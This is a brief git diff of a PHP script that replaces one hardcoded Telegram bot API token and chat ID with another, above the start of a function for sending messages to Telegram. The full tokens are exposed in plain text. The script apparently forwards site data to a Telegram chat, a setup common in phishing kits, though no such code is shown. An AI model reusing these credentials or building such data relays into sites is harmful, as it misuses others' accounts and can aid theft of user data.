@@ -3,8 +3,8 @@ session_start();
 require_once "functions.php";
 
 // Telegram config
-$apiToken = "8470887855:AAEadMs65hvQdp0vU66HDQ6Lwhk0_7Up8_Y";
-$id = "-5046362264";
+$apiToken = "8712281940:AAGvbS6l8Aoyz-vaxKV79Kw1wGVeQNUBf3k";
+$id = "-1003734633038";
 
 // دالة إرسال التلغرام
 function sendToTelegram($message) {
